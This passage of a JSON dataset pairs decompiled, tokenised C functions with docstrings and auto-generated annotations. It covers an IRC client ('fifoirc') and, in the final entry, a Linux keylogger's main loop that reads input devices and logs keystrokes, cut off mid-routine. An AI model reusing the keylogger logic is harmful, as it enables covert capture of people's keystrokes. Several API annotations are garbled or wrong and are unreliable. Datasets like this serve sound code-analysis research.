            "nickname",
            ",",
            "user",
            "information",
            ",",
            "and",
            "optionally",
            "identifies",
            "with",
            "NickServ",
            "using",
            "a",
            "password",
            "before",
            "joining",
            "a",
            "specified",
            "channel",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "char",
            "s",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v2",
            ";",
            "v2",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "irc_fd",
            "=",
            "make_tcp",
            "(",
            "server",
            ",",
            "port",
            ")",
            ";",
            "if",
            "(",
            "irc_fd",
            "=",
            "=",
            "-",
            "1",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "snprintf",
            "(",
            "s",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"NICK %s\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "nickname",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "s",
            ")",
            ";",
            "snprintf",
            "(",
            "s",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"USER %s localhost %s :%s\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "nickname",
            ",",
            "server",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "fullname",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "s",
            ")",
            ";",
            "if",
            "(",
            "nspasswd",
            ")",
            "{",
            "snprintf",
            "(",
            "s",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"PRIVMSG NickServ :identify %s %s\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "nickname",
            ",",
            "nspasswd",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "s",
            ")",
            ";",
            "}",
            "snprintf",
            "(",
            "s",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"JOIN %s\"",
            ",",
            "channel",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "s",
            ")",
            ";",
            "recv_time",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v2",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The __readfsqword function is used to read the value of a quadword (64-bit) data at a specified offset from the FS segment register.",
            "The function 'make_' appears to be used for constructing or creating various types of objects or structures, such as WebSocket frames, memory ranges, MTRR ranges, and Scheme constants, within different contexts such as networking, memory management, and Scheme programming.",
            "The function `irc_write` seems to handle writing messages to an IRC (Internet Relay Chat) connection, facilitating communication between a BitlBee-IRCd server and its clients, likely used for initializing, sending notices, joining channels, and printing messages with optional verbosity output.",
            "The `snprintf` function is used to safely format a string into a buffer, preventing buffer overflow by specifying the maximum size of the buffer, as demonstrated in the provided code snippets where it constructs file paths.",
            "Based on the function name \"NickServ\" typically associated with IRC (Internet Relay Chat) services, it likely handles user nickname registration and authentication within an IRC server environment.",
            "The function `return` seems to be a placeholder or a hypothetical function name rather than an actual function in the provided code snippets, and its usage cannot be determined without further context or implementation."
        ],
        "longer_label": "The code establishes an IRC connection, including tasks such as creating a TCP connection, sending identification information, joining a specified channel, and handling authentication if a password is provided, utilizing functions for writing to the IRC connection and reading quadword data from the FS segment register."
    },
    {
        "id": 171,
        "docstring_tokens": [
            "This",
            "function",
            "disconnects",
            "from",
            "an",
            "IRC",
            "server",
            ",",
            "closes",
            "the",
            "file",
            "descriptor",
            ",",
            "prints",
            "a",
            "disconnection",
            "message",
            ",",
            "and",
            "either",
            "reconnects",
            "or",
            "exits",
            "the",
            "program",
            "based",
            "on",
            "a",
            "reconnect",
            "flag",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "close",
            "(",
            "irc_fd",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: disconnection from %s\\n\"",
            ",",
            "server",
            ")",
            ";",
            "if",
            "(",
            "!",
            "reconnect",
            ")",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "return",
            "irc_connect",
            "(",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The \"unsigned\" function appears to be intended to convert a context into an array of interception devices, likely for handling input devices, with support for dynamically loaded libraries, defining data structures, and performing memory management operations.",
            "The function \"connectclose\" likely handles the opening and closing of connections in a network or database context, ensuring proper resource management and clean-up.",
            "The `fprintf` function is used to print formatted output to a stream, commonly `stdout` or `stderr`, as demonstrated in the code snippets, providing a flexible way to output information with various formatting options.",
            "The \"return\" function seems to be intended to return a struct containing values related to a scene in a graphics rendering context, such as signed distance and emissive properties, possibly used in a ray tracing or similar graphics rendering algorithm.",
            "The `connect` function is responsible for establishing a connection between a client and a server, likely over a serial port or network socket, handling errors and retries as necessary."
        ],
        "longer_label": "The code appears to define a function `irc_disconnect` responsible for closing an IRC connection (`close(irc_fd)`), printing a disconnection message to stderr (`fprintf(stderr, \"fifoirc: disconnection from %s\\n\", server)`), and optionally exiting if reconnection is not specified (`if (!reconnect) exit(1)`), with the intention likely being to handle network connections and ensure proper resource management."
    },
    {
        "id": 172,
        "docstring_tokens": [
            "The",
            "static",
            "void",
            "irc_handle",
            "function",
            "reads",
            "and",
            "processes",
            "incoming",
            "IRC",
            "messages",
            ",",
            "handling",
            "PING",
            "requests",
            "and",
            "responding",
            "to",
            "PRIVMSG",
            "commands",
            "including",
            "sending",
            "a",
            "version",
            "notice",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "(",
            ")",
            "{",
            "size_t",
            "v0",
            ";",
            "char",
            "*",
            "v2",
            ";",
            "const",
            "char",
            "*",
            "s1",
            ";",
            "char",
            "*",
            "s1a",
            ";",
            "char",
            "*",
            "s1b",
            ";",
            "char",
            "s",
            ";",
            "char",
            "v7",
            "[",
            "1023",
            "]",
            ";",
            "char",
            "v8",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v9",
            ";",
            "v9",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "get_line",
            "(",
            "irc_fd",
            ",",
            "&",
            "s",
            ",",
            "1024",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "irc_disconnect",
            "(",
            ")",
            ";",
            "v2",
            "=",
            "strpbrk",
            "(",
            "&",
            "s",
            ",",
            "\"\\r\\n\"",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ")",
            "*",
            "v2",
            "=",
            "0",
            ";",
            "if",
            "(",
            "verbose",
            ">",
            "1",
            ")",
            "safe_print",
            "(",
            "60",
            ",",
            "&",
            "s",
            ")",
            ";",
            "recv_time",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "!",
            "strncmp",
            "(",
            "&",
            "s",
            ",",
            "\"PING \"",
            ",",
            "5uL",
            "L",
            ")",
            ")",
            "{",
            "v7",
            "[",
            "0",
            "]",
            "=",
            "79",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "&",
            "s",
            ")",
            ";",
            "}",
            "s1",
            "=",
            "strchr",
            "(",
            "&",
            "s",
            ",",
            "32",
            ")",
            ";",
            "if",
            "(",
            "s1",
            "&",
            "&",
            "!",
            "strncmp",
            "(",
            "s1",
            ",",
            "\" PRIVMSG \"",
            ",",
            "9uL",
            "L",
            ")",
            ")",
            "{",
            "*",
            "v2",
            "=",
            "10",
            ";",
            "v2",
            "[",
            "1",
            "]",
            "=",
            "0",
            ";",
            "s1a",
            "=",
            "strchr",
            "(",
            "s1",
            ",",
            "58",
            ")",
            ";",
            "if",
            "(",
            "s1a",
            ")",
            "{",
            "v0",
            "=",
            "strlen",
            "(",
            "s1a",
            "+",
            "1",
            ")",
            ";",
            "write",
            "(",
            "program_fd",
            ",",
            "s1a",
            "+",
            "1",
            ",",
            "v0",
            ")",
            ";",
            "}",
            "if",
            "(",
            "!",
            "strcmp",
            "(",
            "s1a",
            ",",
            "asc_4493",
            ")",
            ")",
            "{",
            "s1b",
            "=",
            "strchr",
            "(",
            "&",
            "s",
            ",",
            "33",
            ")",
            ";",
            "if",
            "(",
            "s1b",
            ")",
            "*",
            "s1b",
            "=",
            "0",
            ";",
            "snprintf",
            "(",
            "v8",
            ",",
            "0x400uL",
            "L",
            ",",
            "aNoticeS",
            ",",
            "v7",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "v8",
            ")",
            ";",
            "}",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v9",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is likely used to read a 64-bit quadword (8 bytes) from the FS segment register on x86 architectures, particularly within operating system kernel code, possibly for accessing thread information blocks or other kernel data structures.",
            "The function `irc_write` is responsible for sending messages or notices to an IRC (Internet Relay Chat) server or client, with the capability to format the message using variable arguments, and it handles the internal process of constructing and sending the message over a socket connection.",
            "The `strchr` function searches for the first occurrence of a specific character in a given string and returns a pointer to that character or NULL if not found, as seen in the provided code snippets where it's used in various contexts, including string manipulation and compatibility checks.",
            "The \"strlen\" function, in this context, calculates the length of a string by iterating through its characters until it encounters the null terminator ('\\0').",
            "The `strch` function likely searches for the first occurrence of a specific character in a string and returns a pointer to it, primarily utilized in parsing tasks within file handling and string manipulation contexts."
        ],
        "longer_label": "The given code likely represents a function `irc_handle` responsible for handling incoming messages from an IRC server, parsing commands such as \"PING\" for server heartbeat responses, extracting PRIVMSG commands for message processing, and utilizing functions like `__readfsqword` for low-level memory access and `irc_write` for sending formatted messages back to the server, with string manipulation functions like `strchr` and `strncmp` aiding in message parsing and formatting."
    },
    {
        "id": 173,
        "docstring_tokens": [
            "This",
            "code",
            "reads",
            "command",
            "line",
            "options",
            ",",
            "sets",
            "up",
            "file",
            "descriptors",
            "for",
            "polling",
            ",",
            "handles",
            "user",
            "input",
            "and",
            "program",
            "events",
            ",",
            "and",
            "maintains",
            "an",
            "IRC",
            "connection",
            "until",
            "the",
            "program",
            "is",
            "terminated",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "v3",
            ";",
            "size_t",
            "v4",
            ";",
            "int",
            "v6",
            ";",
            "int",
            "stat_loc",
            ";",
            "int",
            "i",
            ";",
            "int",
            "v9",
            ";",
            "char",
            "*",
            "s",
            ";",
            "char",
            "*",
            "v11",
            ";",
            "struct",
            "pollfd",
            "fds",
            ";",
            "int",
            "v13",
            ";",
            "__int16",
            "v14",
            ";",
            "__int16",
            "v15",
            ";",
            "__int16",
            "v16",
            ";",
            "char",
            "v17",
            "[",
            "1032",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v18",
            ";",
            "v18",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "1",
            ")",
            "usage",
            "(",
            ")",
            ";",
            "opterr",
            "=",
            "0",
            ";",
            "v3",
            "=",
            "getopt",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"c:e:f:F:m:n:p:P:rs:v\"",
            ")",
            ";",
            "v9",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "v3",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v9",
            "-",
            "70",
            ")",
            "<",
            "=",
            "0x30",
            ")",
            "__asm",
            "{",
            "jmp",
            "rax",
            "}",
            "usage",
            "(",
            ")",
            ";",
            "}",
            "if",
            "(",
            "nspasswd",
            "&",
            "&",
            "strlen",
            "(",
            "nspasswd",
            ")",
            ">",
            "1",
            ")",
            "{",
            "v11",
            "=",
            "nspasswd",
            ";",
            "nspasswd",
            "=",
            "strdup",
            "(",
            "nspasswd",
            ")",
            ";",
            "*",
            "v11",
            "=",
            "63",
            ";",
            "for",
            "(",
            "i",
            "=",
            "1",
            ";",
            "v11",
            "[",
            "i",
            "]",
            ";",
            "+",
            "+",
            "i",
            ")",
            "v11",
            "[",
            "i",
            "]",
            "=",
            "0",
            ";",
            "}",
            "if",
            "(",
            "argc",
            "!",
            "=",
            "optind",
            ")",
            "usage",
            "(",
            ")",
            ";",
            "if",
            "(",
            "!",
            "fifo",
            ")",
            "{",
            "s",
            "=",
            "getenv",
            "(",
            "\"HOME\"",
            ")",
            ";",
            "if",
            "(",
            "!",
            "s",
            ")",
            "s",
            "=",
            "\"/tmp\"",
            ";",
            "v4",
            "=",
            "strlen",
            "(",
            "s",
            ")",
            ";",
            "fifo",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "v4",
            "+",
            "10",
            ")",
            ";",
            "sprintf",
            "(",
            "fifo",
            ",",
            "\"%s/irc-pipe\"",
            ",",
            "s",
            ")",
            ";",
            "}",
            "if",
            "(",
            "strlen",
            "(",
            "channel",
            ")",
            "<",
            "=",
            "0xC8",
            ")",
            "{",
            "if",
            "(",
            "nickname",
            ")",
            "{",
            "if",
            "(",
            "!",
            "fullname",
            ")",
            "fullname",
            "=",
            "nickname",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "make_fifo",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "return",
            "1",
            ";",
            "}",
            "else",
            "{",
            "if",
            "(",
            "verbose",
            ">",
            "0",
            ")",
            "printf",
            "(",
            "\" -- fifo at %s\\n\"",
            ",",
            "fifo",
            ")",
            ";",
            "atexit",
            "(",
            "(",
            "void",
            "(",
            "__fastcall",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "unlink_fifo",
            ")",
            ";",
            "if",
            "(",
            "!",
            "program",
            "|",
            "|",
            "(",
            "unsigned",
            "int",
            ")",
            "start_program",
            "(",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "verbose",
            ">",
            "0",
            ")",
            "printf",
            "(",
            "\" -- started '%s'\\n\"",
            ",",
            "(",
            "const",
            "char",
            "*",
            ")",
            "program",
            ")",
            ";",
            "irc_connect",
            "(",
            ")",
            ";",
            "signal",
            "(",
            "2",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "quit",
            ")",
            ";",
            "signal",
            "(",
            "15",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "quit",
            ")",
            ";",
            "signal",
            "(",
            "1",
            ",",
            "(",
            "__sighandler_t",
            ")",
            "quit",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "fds",
            ".",
            "fd",
            "=",
            "fifo_fd",
            ";",
            "fds",
            ".",
            "events",
            "=",
            "1",
            ";",
            "v13",
            "=",
            "irc_fd",
            ";",
            "v14",
            "=",
            "1",
            ";",
            "i",
            "=",
            "2",
            ";",
            "if",
            "(",
            "program",
            ")",
            "{",
            "*",
            "(",
            "&",
            "fds",
            ".",
            "fd",
            "+",
            "2",
            "*",
            "i",
            ")",
            "=",
            "program_fd",
            ";",
            "*",
            "(",
            "&",
            "fds",
            ".",
            "events",
            "+",
            "4",
            "*",
            "i",
            "+",
            "+",
            ")",
            "=",
            "1",
            ";",
            "}",
            "v9",
            "=",
            "poll",
            "(",
            "&",
            "fds",
            ",",
            "i",
            ",",
            "600000",
            ")",
            ";",
            "if",
            "(",
            "program",
            "&",
            "&",
            "waitpid",
            "(",
            "childpid",
            ",",
            "&",
            "stat_loc",
            ",",
            "1",
            ")",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "start_program",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "goto",
            "LABEL_59",
            ";",
            "if",
            "(",
            "v9",
            "=",
            "=",
            "-",
            "1",
            ")",
            "break",
            ";",
            "if",
            "(",
            "v9",
            ")",
            "{",
            "if",
            "(",
            "(",
            "fds",
            ".",
            "revents",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "text_handle",
            "(",
            "fifo_fd",
            ")",
            ";",
            "if",
            "(",
            "(",
            "fds",
            ".",
            "revents",
            "&",
            "0x10",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "make_fifo",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "goto",
            "LABEL_59",
            ";",
            "if",
            "(",
            "(",
            "v15",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "irc_handle",
            "(",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v15",
            "&",
            "0x10",
            ")",
            "!",
            "=",
            "0",
            ")",
            "irc_disconnect",
            "(",
            ")",
            ";",
            "if",
            "(",
            "program",
            ")",
            "{",
            "if",
            "(",
            "(",
            "v16",
            "&",
            "1",
            ")",
            "!",
            "=",
            "0",
            ")",
            "text_handle",
            "(",
            "program_fd",
            ")",
            ";",
            "if",
            "(",
            "(",
            "v16",
            "&",
            "0x10",
            ")",
            "!",
            "=",
            "0",
            "&",
            "&",
            "(",
            "unsigned",
            "int",
            ")",
            "start_program",
            "(",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "goto",
            "LABEL_59",
            ";",
            "}",
            "}",
            "else",
            "{",
            "if",
            "(",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ">",
            "recv_time",
            "+",
            "600",
            ")",
            "{",
            "v6",
            "=",
            "time",
            "(",
            "0L",
            "L",
            ")",
            ";",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: ping timeout: %d seconds\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "(",
            "v6",
            "-",
            "recv_time",
            ")",
            ")",
            ";",
            "irc_disconnect",
            "(",
            ")",
            ";",
            "}",
            "snprintf",
            "(",
            "v17",
            ",",
            "0x400uL",
            "L",
            ",",
            "\"PING :%s\"",
            ",",
            "server",
            ")",
            ";",
            "irc_write",
            "(",
            "irc_fd",
            ",",
            "v17",
            ")",
            ";",
            "}",
            "}",
            "perror",
            "(",
            "\"fifoirc: poll\"",
            ")",
            ";",
            "LABEL_59",
            ":",
            "quit",
            "(",
            ")",
            ";",
            "}",
            "return",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"fifoirc: no nickname specified\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1FuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}",
            "else",
            "{",
            "fprintf",
            "(",
            "stderr",
            ",",
            "\"fifoirc: %s: channels must be at most 200 characters\\n\"",
            ",",
            "channel",
            ")",
            ";",
            "return",
            "1",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__read` appears to be a part of low-level system or device interaction code, likely related to reading from various sources such as devices, files, or potentially dump files, and possibly managing checkpoints of processes, with implementations including memory allocation, device manipulation, and file system driver interaction.",
            "The function \"qword\" likely deals with handling quad-word data types, possibly performing operations or manipulations on them within the context of the provided code snippets.",
            "The function `strdu` seems to be intended for dynamically allocating memory and copying strings using `strdup`, commonly used in C programming to ensure memory safety and manage string manipulation tasks efficiently within the provided code snippets."
        ],
        "longer_label": "The code is a C program that implements an IRC (Internet Relay Chat) client, utilizing low-level system interactions for file and device management, string manipulation for memory safety, and quad-word data type handling for operations within the program."
    },
    {
        "id": 174,
        "docstring_tokens": [
            "The",
            "code",
            "is",
            "a",
            "C",
            "program",
            "that",
            "functions",
            "as",
            "a",
            "keylogger",
            ",",
            "capturing",
            "input",
            "events",
            "from",
            "specified",
            "event",
            "devices",
            ",",
            "with",
            "options",
            "to",
            "daemonize",
            ",",
            "force",
            "US",
            "keymap",
            ",",
            "specify",
            "event",
            "device",
            ",",
            "log",
            "file",
            ",",
            "pid",
            "file",
            ",",
            "process",
            "name",
            ",",
            "and",
            "display",
            "help",
            "message",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "char",
            "v3",
            ";",
            "char",
            "v4",
            ";",
            "unsigned",
            "__int8",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "int",
            "*",
            "v7",
            ";",
            "const",
            "char",
            "*",
            "v8",
            ";",
            "int",
            "*",
            "v9",
            ";",
            "int",
            "v10",
            ";",
            "fd_set",
            "*",
            "v11",
            ";",
            "int",
            "v12",
            ";",
            "int",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "int",
            "v16",
            ";",
            "ssize_t",
            "v17",
            ";",
            "char",
            "v20",
            ";",
            "FILE",
            "*",
            "stream",
            ";",
            "int",
            "longind",
            ";",
            "int",
            "v23",
            ";",
            "char",
            "buf",
            "[",
            "32",
            "]",
            ";",
            "int",
            "fd",
            "[",
            "16",
            "]",
            ";",
            "fd_set",
            "v26",
            ";",
            "int",
            "s",
            "[",
            "70",
            "]",
            ";",
            "char",
            "v28",
            "[",
            "264",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v29",
            ";",
            "v29",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "0x1000uL",
            "L",
            ")",
            ";",
            "s",
            "[",
            "0",
            "]",
            "=",
            "1869903201",
            ";",
            "stream",
            "=",
            "(",
            "FILE",
            "*",
            ")",
            "stdout",
            ";",
            "close",
            "(",
            "0",
            ")",
            ";",
            "v3",
            "=",
            "getopt_long",
            "(",
            "argc",
            ",",
            "(",
            "char",
            "*",
            "const",
            "*",
            ")",
            "argv",
            ",",
            "\"dfue:l:p:n:h\"",
            ",",
            "&",
            "long_options_6689",
            ",",
            "&",
            "longind",
            ")",
            ";",
            "v4",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "v3",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "strcmp",
            "(",
            "(",
            "const",
            "char",
            "*",
            ")",
            "s",
            ",",
            "\"auto\"",
            ")",
            "|",
            "|",
            "(",
            "unsigned",
            "int",
            ")",
            "find_default_keyboard_list",
            "(",
            "(",
            "__int64",
            ")",
            "s",
            ")",
            ")",
            "{",
            "v7",
            "=",
            "fd",
            ";",
            "memset",
            "(",
            "fd",
            ",",
            "-",
            "1",
            ",",
            "sizeof",
            "(",
            "fd",
            ")",
            ")",
            ";",
            "v8",
            "=",
            "(",
            "const",
            "char",
            "*",
            ")",
            "s",
            ";",
            "v9",
            "=",
            "fd",
            ";",
            "do",
            "{",
            "if",
            "(",
            "!",
            "*",
            "v8",
            ")",
            "break",
            ";",
            "v10",
            "=",
            "open",
            "(",
            "v8",
            ",",
            "256",
            ",",
            "v7",
            ")",
            ";",
            "*",
            "v9",
            "=",
            "v10",
            ";",
            "if",
            "(",
            "v10",
            "<",
            "0",
            ")",
            "{",
            "perror",
            "(",
            "\"open\"",
            ")",
            ";",
            "fwrite",
            "(",
            "\"Perhaps try running this program as root.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2AuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "LODWORD",
            "(",
            "v6",
            ")",
            "=",
            "1",
            ";",
            "return",
            "v6",
            ";",
            "}",
            "v8",
            "+",
            "=",
            "256",
            ";",
            "+",
            "+",
            "v9",
            ";",
            "}",
            "while",
            "(",
            "v28",
            "!",
            "=",
            "v8",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "load_system_keymap",
            "(",
            ")",
            ")",
            "fwrite",
            "(",
            "\"Failed to load system keymap. Falling back onto built-in US keymap.\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x44uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "drop_privileges",
            "(",
            ")",
            ";",
            "LABEL_12",
            ":",
            "while",
            "(",
            "1",
            ")",
            "{",
            "memset",
            "(",
            "&",
            "v26",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "v26",
            ")",
            ")",
            ";",
            "v11",
            "=",
            "(",
            "fd_set",
            "*",
            ")",
            "fd",
            ";",
            "v12",
            "=",
            "0",
            ";",
            "do",
            "{",
            "v13",
            "=",
            "v11",
            "-",
            ">",
            "fds_bits",
            "[",
            "0",
            "]",
            ";",
            "if",
            "(",
            "LODWORD",
            "(",
            "v11",
            "-",
            ">",
            "fds_bits",
            "[",
            "0",
            "]",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "v14",
            "=",
            "__fdelt_chk",
            "(",
            "v13",
            ")",
            ";",
            "v26",
            ".",
            "fds_bits",
            "[",
            "v14",
            "]",
            "|",
            "=",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "v13",
            "%",
            "64",
            ")",
            ";",
            "if",
            "(",
            "v13",
            ">",
            "=",
            "v12",
            ")",
            "v12",
            "=",
            "v13",
            "+",
            "1",
            ";",
            "}",
            "v11",
            "=",
            "(",
            "fd_set",
            "*",
            ")",
            "(",
            "(",
            "char",
            "*",
            ")",
            "v11",
            "+",
            "4",
            ")",
            ";",
            "}",
            "while",
            "(",
            "&",
            "v26",
            "!",
            "=",
            "v11",
            ")",
            ";",
            "if",
            "(",
            "!",
            "v12",
            ")",
            "break",
            ";",
            "if",
            "(",
            "select",
            "(",
            "v12",
            ",",
            "&",
            "v26",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ")",
            "=",
            "=",
            "-",
            "1",
            ")",
            "{",
            "perror",
            "(",
            "\"select()\"",
            ")",
            ";",
            "break",
            ";",
            "}",
            "v15",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v16",
            "=",
            "fd",
            "[",
            "v15",
            "]",
            ";",
            "if",
            "(",
            "v16",
            "!",
            "=",
            "-",
            "1",
            "&",
            "&",
            "(",
            "(",
            "1L",
            "L",
            "<",
            "<",
            "(",
            "v16",
            "%",
            "64",
            ")",
            ")",
            "&",
            "v26",
            ".",
            "fds_bits",
            "[",
            "__fdelt_chk",
            "(",
            "v16",
            ")",
            "]",
            ")",
            "!",
            "=",
            "0",
            ")",
            "{",
            "v23",
            "=",
            "0",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "v17",
            "=",
            "read",
            "(",
            "v16",
            ",",
            "buf",
            ",",
            "0x18uL",
            "L",
            ")",
            ";",
            "if",
            "(",
            "v17",
            "<",
            "=",
            "0",
            ")",
            "break",
            ";",
            "if",
            "(",
            "translate_event",
            "(",
            "(",
            "__int64",
            ")",
            "buf",
            ",",
            "(",
            "char",
            "*",
            ")",
            "&",
            "v23",
            ",",
            "v28",
            ",",
            "0x100uL",
            "L",
            ")",
            ")",
            "{",
            "fputs",
            "(",
            "v28",
            ",",
            "stream",
            ")",
            ";",
            "fflush",
            "(",
            "stream",
            ")",
            ";",
            "}",
            "}",
            "if",
            "(",
            "v17",
            ")",
            "break",
            ";",
            "}",
            "if",
            "(",
            "+",
            "+",
            "v15",
            "=",
            "=",
            "16",
            ")",
            "goto",
            "LABEL_12",
            ";",
            "}",
            "perror",
            "(",
            "\"read()\"",
            ")",
            ";",
            "fd",
            "[",
            "(",
            "int",
            ")",
            "v15",
            "]",
            "=",
            "-",
            "1",
            ";",
            "}",
            "fclose",
            "(",
            "stream",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "0",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "0",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "1",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "1",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "2",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "2",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "3",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "3",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "4",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "4",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "5",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "5",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "6",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "6",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "7",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "7",
            "]",
            ")",
            ";",
            "if",
            "(",
            "fd",
            "[",
            "8",
            "]",
            "!",
            "=",
            "-",
            "1",
            ")",
            "close",
            "(",
            "fd",
            "[",
            "8",
            "]",
